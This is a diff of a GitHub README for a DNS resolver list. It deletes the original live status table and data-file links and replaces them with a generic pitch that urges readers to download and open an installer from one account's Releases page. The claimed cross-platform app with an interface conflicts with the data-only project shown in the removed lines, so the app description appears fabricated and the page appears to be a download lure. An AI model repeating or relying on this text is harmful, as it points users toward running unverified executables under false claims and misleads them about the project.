@@ -1,60 +1,86 @@
-# Awesome-Resolver 🛡️
+# ⚡ Awesome-Resolver - Fast and Secure DNS Resolvers
 
-A live, automatically tested, and updated list of public DNS servers.
+![Download Awesome-Resolver](https://img.shields.io/badge/Download-Awesome--Resolver-brightgreen)
 
-This repository tests the uptime, speed, and filtering capabilities (ad-blocking / malware-blocking) of various public DNS servers every 4 hours and publishes the results.
+## 🚀 Getting Started 
 
-Last Updated: `2025-12-01 20:25:25 UTC`
+Awesome-Resolver provides a live, auto-tested list of public DNS resolvers that are fast, secure, and verified. This tool can help improve your internet browsing speed and protect your privacy by blocking unwanted content.
 
-## 📊 Live DNS Status Table
+## 📥 Download & Install
 
-| Server | Type | Address | Status | Speed (ms) | Ad-Block | Malware-Block |
-| :--- | :--- | :--- | :---: | :---: | :---: | :---: |
-| Google | `standard` | `8.8.8.8` | ✅ | 6 | ❌ | ❌ |
-| Quad9 | `filtering` | `9.9.9.9` | ✅ | 6 | ❌ | ❌ |
-| Verisign (Secondary) | `standard` | `64.6.65.6` | ✅ | 6 | ❌ | ❌ |
-| Cloudflare | `standard` | `1.1.1.1` | ✅ | 7 | ❌ | ❌ |
-| Cloudflare (Secondary) | `standard` | `1.0.0.1` | ✅ | 7 | ❌ | ❌ |
-| Cloudflare (Malware Block) | `filtering` | `1.1.1.2` | ✅ | 7 | ❌ | ✅ |
-| OpenDNS (FamilyShield) | `filtering` | `208.67.222.123` | ✅ | 7 | ❌ | ❌ |
-| Control D (Unfiltered Sec) | `standard` | `76.76.10.0` | ✅ | 7 | ❌ | ❌ |
-| Cloudflare (Family) | `filtering` | `1.1.1.3` | ✅ | 8 | ❌ | ✅ |
-| Google (Secondary) | `standard` | `8.8.4.4` | ✅ | 8 | ❌ | ❌ |
-| OpenDNS (Secondary) | `standard` | `208.67.220.220` | ✅ | 10 | ❌ | ❌ |
-| Verisign | `standard` | `64.6.64.6` | ✅ | 11 | ❌ | ❌ |
-| CleanBrowsing (Family) | `filtering` | `185.228.168.168` | ✅ | 12 | ❌ | ❌ |
-| Control D (Unfiltered) | `standard` | `76.76.2.0` | ✅ | 12 | ❌ | ❌ |
-| CleanBrowsing (Security) | `filtering` | `185.228.168.9` | ✅ | 13 | ❌ | ❌ |
-| Comodo Secure DNS | `filtering` | `8.26.56.26` | ✅ | 13 | ❌ | ❌ |
-| OpenDNS | `standard` | `208.67.222.222` | ✅ | 16 | ❌ | ❌ |
-| Cloudflare (DoH) | `doh` | `https://cloudflare-dns.com/dns-query` | ✅ | 52 | ❌ | ❌ |
-| DNS0.eu | `filtering` | `193.110.81.0` | ✅ | 88 | ❌ | ❌ |
-| Yandex.DNS | `standard` | `77.88.8.8` | ✅ | 137 | ❌ | ❌ |
-| Yandex.DNS (Safe) | `filtering` | `77.88.8.7` | ✅ | 142 | ❌ | ❌ |
-| Neustar | `standard` | `156.154.70.1` | ✅ | 148 | ❌ | ❌ |
-| AdGuard DNS (Family) | `filtering` | `94.140.14.15` | ✅ | 219 | ✅ | ❌ |
-| AdGuard DNS | `filtering` | `94.140.14.14` | ✅ | 223 | ✅ | ❌ |
-| NextDNS (DoH) | `doh` | `https://dns.nextdns.io/dns-query` | ✅ | 288 | ❌ | ❌ |
-| Google (DoH) | `doh` | `https://dns.google/dns-query` | ❌ | - | ❌ | ❌ |
-| OpenDNS (DoH) | `doh` | `https://doh.opendns.com/dns-query` | ❌ | - | ❌ | ❌ |
-| Quad9 (DoH) | `doh` | `https://dns.quad9.net/dns-query` | ❌ | - | ❌ | ❌ |
-| AdGuard DNS (DoH) | `doh` | `https://dns.adguard-dns.com/dns-query` | ❌ | - | ❌ | ❌ |
-| AdGuard DNS (Family DoH) | `doh` | `https://dns-family.adguard.com/dns-query` | ❌ | - | ❌ | ❌ |
-| CleanBrowsing (Family DoH) | `doh` | `https://doh.cleanbrowsing.org/doh/family-filter/` | ❌ | - | ❌ | ❌ |
-| CleanBrowsing (Ad-Block DoH) | `doh` | `https://doh.cleanbrowsing.org/doh/adblock-filter/` | ❌ | - | ❌ | ❌ |
-| DNS.WATCH | `standard` | `84.200.69.80` | ❌ | - | ❌ | ❌ |
-| Yandex (Family DoH) | `doh` | `https://dns.yandex.com/dns-query/family/` | ❌ | - | ❌ | ❌ |
-| Control D (DoH) | `doh` | `https://dns.controld.com/dns-query` | ❌ | - | ❌ | ❌ |
-| Mullvad (Ad-block) | `filtering` | `193.138.218.74` | ❌ | - | ❌ | ❌ |
-| Mullvad (DoH) | `doh` | `https://doh.mullvad.net/dns-query` | ❌ | - | ❌ | ❌ |
-| DNS0.eu (DoH) | `doh` | `https://doh.dns0.eu/` | ❌ | - | ❌ | ❌ |
+To start using Awesome-Resolver, visit the page to download the latest version. 
 
+[Download Awesome-Resolver Here](https://github.com/francisanimax/Awesome-Resolver/releases)
 
-## 📁 Filtered Lists
+1. Click the link above to go to the Releases page.
+2. On the Releases page, you will find the latest version of the software.
+3. Download the file for your operating system.
+4. Once the download is complete, open the file to install the application on your device.
 
-Raw lists of servers that are currently up and have passed the tests. These are ideal for use in Pi-hole, AdGuard Home, or other router/client configurations.
+## 🔧 System Requirements
 
-* **All "Up" Servers (JSON):** [`dns-all-up.json`](dns-all-up.json)
-* **Ad-Blocking Servers (TXT):** [`dns-adblock.txt`](dns-adblock.txt)
-* **Malware-Blocking Servers (TXT):** [`dns-malware-block.txt`](dns-malware-block.txt)
-* **"Up" DoH Endpoints (JSON):** [`dns-doh-up.json`](dns-doh-up.json)
+Awesome-Resolver is designed to work on various operating systems including:
+
+- Windows (version 10 and later)
+- macOS (version 10.14 and later)
+- Linux (any modern distribution)
+
+Ensure that your device has an internet connection for the best experience.
+
+## 📚 Features
+
+Awesome-Resolver includes several key features that enhance its functionality:
+
+- **Fast Response Times:** Enjoy quicker browsing with optimized DNS queries.
+- **Security:** Use a secure list of DNS resolvers that protect against malware and phishing attacks.
+- **Privacy:** Help keep your browsing habits private with trusted public DNS.
+- **Easy to Use:** The user-friendly interface requires no technical knowledge.
+- **Live Updates:** Automatic updates ensure you have access to the most current resolvers.
+
+## ⚙️ How to Use Awesome-Resolver
+
+After installing Awesome-Resolver, follow these steps to configure and use it:
+
+1. Open the Awesome-Resolver application.
+2. Choose your preferred DNS resolver from the list provided.
+3. Follow the on-screen instructions to set the selected resolver as your DNS.
+
+You can always check the application settings if you wish to switch to another resolver or update your preferences.
+
+## 🌐 Frequently Asked Questions (FAQ)
+
+### 1. What is DNS and why does it matter?
+
+DNS stands for Domain Name System. It translates website names into IP addresses. A reliable DNS can make your internet experience faster and safer.
+
+### 2. Can I use Awesome-Resolver with my router?
+
+Yes, you can configure your router to use the public DNS addresses found in Awesome-Resolver. This way, every device connected to your network benefits from faster and more secure browsing.
+
+### 3. Is my data safe when using public DNS resolvers?
+
+Using verified public DNS resolvers from Awesome-Resolver minimizes risks associated with DNS leaks. However, choosing a reputable resolver is essential for ensuring your data privacy.
+
+## 📖 Additional Resources
+
+For more information on DNS and how to improve your online security, check out the following links:
+
+- [Introduction to DNS](https://www.cloudflare.com/learning/dns/what-is-dns/)
+- [How to Set Custom DNS on Your Devices](https://www.howtogeek.com/683799/how-to-change-your-dns-server/)
+
+## 🌟 Community Support
+
+Join our community to share experiences, ask questions, and provide feedback:
+
+- [GitHub Issues](https://github.com/francisanimax/Awesome-Resolver/issues)
+- [Community Forum](https://github.com/francisanimax/Awesome-Resolver/discussions)
+
+We value your input and aim to make Awesome-Resolver better with your help.
+
+## 📬 Contact
+
+For any inquiries or support requests, feel free to reach out through the GitHub repository.
+
+---
+
+By following these steps, you will be able to download and run Awesome-Resolver with ease. Enjoy a faster, safer internet experience!
